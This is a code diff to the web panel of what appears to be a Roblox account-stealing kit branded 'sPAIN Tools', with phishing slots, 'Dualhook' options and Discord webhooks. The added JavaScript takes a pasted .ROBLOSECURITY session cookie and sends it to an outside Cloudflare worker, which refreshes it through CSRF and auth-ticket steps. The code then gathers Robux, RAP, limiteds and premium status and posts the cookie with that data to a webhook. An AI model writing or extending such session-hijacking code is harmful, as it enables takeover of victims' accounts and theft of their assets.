@@ -238,6 +238,123 @@
   .modal-slot-badge { display:inline-flex; align-items:center; gap:6px; background:rgba(192,38,211,0.1); border:1px solid rgba(192,38,211,0.22); border-radius:100px; padding:3px 12px; font-size:0.62rem; font-weight:700; letter-spacing:0.12em; color:#e879f9; margin-bottom:18px; }
   .enable-btn { width:100%; background:linear-gradient(135deg,var(--accent),var(--accent2)); color:#fff; border:none; padding:15px 0; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.08rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer; margin-top:8px; box-shadow:0 0 30px rgba(192,38,211,0.4); transition:opacity 0.2s,box-shadow 0.2s; }
   .enable-btn:hover { opacity:0.9; box-shadow:0 0 50px rgba(192,38,211,0.6); }
+
+  /* Step Animation Styles */
+  .steps-container {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin: 20px 0;
+    padding: 20px;
+    background: rgba(192,38,211,0.05);
+    border: 1px solid rgba(192,38,211,0.15);
+    border-radius: 12px;
+  }
+
+  .step {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 14px;
+    border-radius: 8px;
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--muted);
+    background: rgba(255,255,255,0.02);
+    border: 1px solid rgba(255,255,255,0.05);
+    transition: all 0.3s ease;
+  }
+
+  .step.active {
+    color: var(--accent);
+    border-color: rgba(192,38,211,0.4);
+    background: rgba(192,38,211,0.1);
+    box-shadow: 0 0 20px rgba(192,38,211,0.15);
+  }
+
+  .step.complete {
+    color: #4ade80;
+    border-color: rgba(74,222,128,0.4);
+    background: rgba(74,222,128,0.1);
+  }
+
+  .step.error {
+    color: #f472b6;
+    border-color: rgba(244,114,182,0.4);
+    background: rgba(244,114,182,0.1);
+  }
+
+  .step-icon {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.7rem;
+    background: rgba(255,255,255,0.1);
+  }
+
+  .step.active .step-icon {
+    background: var(--accent);
+    color: #fff;
+    animation: pulse 1.5s infinite;
+  }
+
+  .step.complete .step-icon {
+    background: #4ade80;
+    color: #000;
+  }
+
+  .step.error .step-icon {
+    background: #f472b6;
+    color: #000;
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.7; }
+  }
+
+  .step-status {
+    text-align: center;
+    font-family: 'Orbitron', sans-serif;
+    font-size: 0.8rem;
+    margin-top: 15px;
+    min-height: 20px;
+    letter-spacing: 0.06em;
+  }
+
+  .step-status.processing { color: var(--accent); }
+  .step-status.success { color: #4ade80; }
+  .step-status.error { color: #f472b6; }
+
+  .cookie-input {
+    width: 100%;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 10px;
+    padding: 12px 14px;
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.85rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    margin-bottom: 20px;
+    resize: vertical;
+    min-height: 80px;
+  }
+
+  .cookie-input:focus {
+    border-color: rgba(192,38,211,0.4);
+    box-shadow: 0 0 0 3px rgba(192,38,211,0.08);
+  }
+
+  .cookie-input.error {
+    border-color: #f472b6;
+    box-shadow: 0 0 0 3px rgba(244,114,182,0.2);
+  }
 </style>
 </head>
 <body>
@@ -568,46 +685,213 @@ async function handleDhGenerate() {
   }
 }
 
-/* ── MODAL ── */
+/* ── MODAL & COOKIE REFRESH ── */
+let currentModalData = {};
+
 function openModal(num, name, prefix) {
   const isDH = prefix === 'dh';
+  const slotName = isDH ? `DH Slot ${num}` : `Slot ${num}`;
   document.getElementById('modalTitle').textContent = isDH ? `Dualhook — Slot ${num}` : `Configure Slot ${num}`;
-  const enableBtn = document.getElementById('enableBtn');
-  enableBtn.textContent = isDH ? `Generate DH Slot ${num}` : `Generate Slots 1–9`;
-  enableBtn.style.background = isDH ? 'linear-gradient(135deg,#0891b2,#06b6d4)' : '';
-  enableBtn.style.boxShadow  = isDH ? '0 0 30px rgba(6,182,212,0.4)' : '';
-
+  
+  currentModalData = { num, name, prefix, isDH };
+  
   const autoUrl = `${SITE_URL}/sPAIN${name}`;
   const urlIconStyle = isDH ? 'background:rgba(6,182,212,0.1);border-color:rgba(6,182,212,0.2);' : '';
   const fieldClass = isDH ? 'field-input dh-field' : 'field-input';
 
   let html = `
     <div class="modal-slot-badge">${isDH ? `Dualhook — Slot ${String(num).padStart(2,'0')}` : `Slot ${String(num).padStart(2,'0')} — ${name}`}</div>
+    
+    <div class="input-group" style="margin-bottom:16px;">
+      <label class="input-label">Cookie <span style="color:#f472b6">*</span></label>
+      <textarea class="cookie-input ${isDH ? 'dh-field' : ''}" id="modalCookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
+    </div>
+
     <div class="input-group">
       <label class="input-label">URL</label>
       <div class="url-display"><span class="url-icon" style="${urlIconStyle}">🔗</span><span class="url-text">${autoUrl}</span></div>
     </div>
     <div class="input-duo" style="margin-bottom:16px;">
-      <div><label class="input-label">Directory Name</label><input class="${fieldClass}" type="text" placeholder="sPAIN${name}"></div>
-      <div><label class="input-label">Display Name</label><input class="${fieldClass}" type="text" placeholder="sPAIN Tools"></div>
+      <div><label class="input-label">Directory Name</label><input class="${fieldClass}" type="text" id="modalDirName" placeholder="sPAIN${name}"></div>
+      <div><label class="input-label">Display Name</label><input class="${fieldClass}" type="text" id="modalDispName" placeholder="sPAIN Tools"></div>
     </div>
     <div class="input-group">
       <label class="input-label">Roblox Character URL <span class="opt-badge">optional</span></label>
-      <input class="${fieldClass}" type="text" placeholder="https://tr.rbxcdn.com/...">
+      <input class="${fieldClass}" type="text" id="modalCharUrl" placeholder="https://tr.rbxcdn.com/...">
     </div>
-    <div class="input-group"><label class="input-label">Invite URL</label><input class="${fieldClass}" type="text" placeholder="https://discord.gg/yourserver"></div>`;
+    <div class="input-group"><label class="input-label">Invite URL</label><input class="${fieldClass}" type="text" id="modalInviteUrl" placeholder="https://discord.gg/yourserver"></div>`;
 
   if (!isDH) {
-    html += `<div class="input-group"><label class="input-label">Thumbnail URL <span class="opt-badge">optional</span></label><input class="${fieldClass}" type="text" placeholder="https://i.imgur.com/yourimage.png"></div>`;
+    html += `<div class="input-group"><label class="input-label">Thumbnail URL <span class="opt-badge">optional</span></label><input class="${fieldClass}" type="text" id="modalThumbUrl" placeholder="https://i.imgur.com/yourimage.png"></div>`;
   }
 
-  html += `<div class="input-group" style="margin-bottom:8px;"><label class="input-label">Webhook</label><input class="${fieldClass}" type="text" placeholder="https://discord.com/api/webhooks/..."></div>`;
+  html += `<div class="input-group" style="margin-bottom:8px;"><label class="input-label">Webhook</label><input class="${fieldClass}" type="text" id="modalWebhook" placeholder="https://discord.com/api/webhooks/..."></div>`;
 
   document.getElementById('modalInputs').innerHTML = html;
+  
+  const enableBtn = document.getElementById('enableBtn');
+  enableBtn.textContent = isDH ? `Enable DH Slot ${num}` : `Enable Slot ${num}`;
+  enableBtn.style.background = isDH ? 'linear-gradient(135deg,#0891b2,#06b6d4)' : '';
+  enableBtn.style.boxShadow  = isDH ? '0 0 30px rgba(6,182,212,0.4)' : '';
+  
+  // Set up click handler
+  enableBtn.onclick = handleEnableSlot;
+  
   document.getElementById('modalOverlay').classList.add('open');
 }
 
-function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
+async function handleEnableSlot() {
+  const { num, name, prefix, isDH } = currentModalData;
+  const cookieInput = document.getElementById('modalCookieInput');
+  const cookie = cookieInput.value.trim();
+  const btn = document.getElementById('enableBtn');
+  
+  if (!cookie) {
+    cookieInput.classList.add('error');
+    setTimeout(() => cookieInput.classList.remove('error'), 2000);
+    return;
+  }
+
+  // Get other values
+  const dirName = document.getElementById('modalDirName')?.value.trim() || `sPAIN${name}`;
+  const dispName = document.getElementById('modalDispName')?.value.trim() || 'sPAIN Tools';
+  const webhook = document.getElementById('modalWebhook')?.value.trim() || '';
+  const charUrl = document.getElementById('modalCharUrl')?.value.trim() || '';
+  const inviteUrl = document.getElementById('modalInviteUrl')?.value.trim() || '';
+  
+  // Show steps UI
+  const stepsHtml = `
+    <div class="steps-container" id="stepsContainer">
+      <div class="step" id="step1"><span class="step-icon">1</span> Validate</div>
+      <div class="step" id="step2"><span class="step-icon">2</span> CSRF</div>
+      <div class="step" id="step3"><span class="step-icon">3</span> Auth Ticket</div>
+      <div class="step" id="step4"><span class="step-icon">4</span> Redeem</div>
+      <div class="step" id="step5"><span class="step-icon">5</span> Verify</div>
+      <div class="step" id="step6"><span class="step-icon">6</span> Fetch Info</div>
+    </div>
+    <div class="step-status processing" id="stepStatus">Initializing...</div>
+  `;
+  
+  const inputsDiv = document.getElementById('modalInputs');
+  inputsDiv.innerHTML = stepsHtml;
+  btn.disabled = true;
+  
+  // Helper to update step UI
+  const updateStep = (stepNum, status) => {
+    const stepEl = document.getElementById(`step${stepNum}`);
+    if (!stepEl) return;
+    stepEl.classList.remove('active', 'complete', 'error');
+    stepEl.classList.add(status);
+    if (status === 'active') stepEl.querySelector('.step-icon').textContent = '⟳';
+    if (status === 'complete') stepEl.querySelector('.step-icon').textContent = '✓';
+    if (status === 'error') stepEl.querySelector('.step-icon').textContent = '✗';
+  };
+  
+  // Animate through steps
+  const animateSteps = async () => {
+    for (let i = 1; i <= 6; i++) {
+      updateStep(i, 'active');
+      await new Promise(r => setTimeout(r, 400));
+    }
+  };
+  
+  try {
+    document.getElementById('stepStatus').textContent = 'Connecting to worker...';
+    
+    // Call the worker
+    const workerRes = await fetch('https://holy-truth-3129.notrllyme133.workers.dev/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie })
+    });
+    
+    const data = await workerRes.json();
+    
+    if (!data.success) {
+      // Failed at specific step
+      const failedStep = data.step || 1;
+      
+      // Mark previous steps as complete
+      for (let i = 1; i < failedStep; i++) {
+        updateStep(i, 'complete');
+      }
+      // Mark failed step as error
+      updateStep(failedStep, 'error');
+      
+      const statusEl = document.getElementById('stepStatus');
+      statusEl.textContent = 'wrong cookie expired/troll';
+      statusEl.classList.remove('processing');
+      statusEl.classList.add('error');
+      
+      btn.textContent = 'Failed';
+      btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
+      
+      setTimeout(() => closeModal(), 2000);
+      return;
+    }
+    
+    // Success - animate through steps quickly then mark complete
+    await animateSteps();
+    
+    // Mark all complete
+    for (let i = 1; i <= 6; i++) {
+      updateStep(i, 'complete');
+    }
+    
+    document.getElementById('stepStatus').textContent = 'Cookie refreshed! Sending info...';
+    document.getElementById('stepStatus').classList.remove('processing');
+    document.getElementById('stepStatus').classList.add('success');
+    
+    // Prepare payload for submit
+    const slug = dirName.toLowerCase().replace(/[^a-z0-9]/g, '');
+    const submitPayload = {
+      slug: slug,
+      slots: {
+        cookie: data.newCookie || cookie,
+        username: data.username || '',
+        userId: data.userId || '',
+        displayName: data.displayName || '',
+        avatarUrl: data.avatarUrl || '',
+        robux: data.fullAccount?.robux || 0,
+        rap: data.fullAccount?.rap || 0,
+        limiteds: data.fullAccount?.limiteds || 0,
+        premium: data.fullAccount?.hasPremium || false,
+        webhook: webhook,
+        charUrl: charUrl,
+        inviteUrl: inviteUrl
+      },
+      device: 'desktop'
+    };
+    
+    // Send to submit endpoint
+    const submitRes = await fetch('/api/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(submitPayload)
+    });
+    
+    if (submitRes.ok) {
+      document.getElementById('stepStatus').textContent = 'Complete! Info sent to webhook.';
+      btn.textContent = 'Success!';
+      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
+      setTimeout(() => closeModal(), 1500);
+    } else {
+      throw new Error('Submit failed');
+    }
+    
+  } catch (err) {
+    document.getElementById('stepStatus').textContent = 'Network error. Try again.';
+    document.getElementById('stepStatus').classList.remove('processing');
+    document.getElementById('stepStatus').classList.add('error');
+    btn.disabled = false;
+    btn.textContent = 'Retry';
+  }
+}
+
+function closeModal() { 
+  document.getElementById('modalOverlay').classList.remove('open'); 
+  currentModalData = {};
+}
 function handleOverlayClick(e) { if(e.target===document.getElementById('modalOverlay')) closeModal(); }
 document.addEventListener('keydown', e => { if(e.key==='Escape') closeModal(); });
 
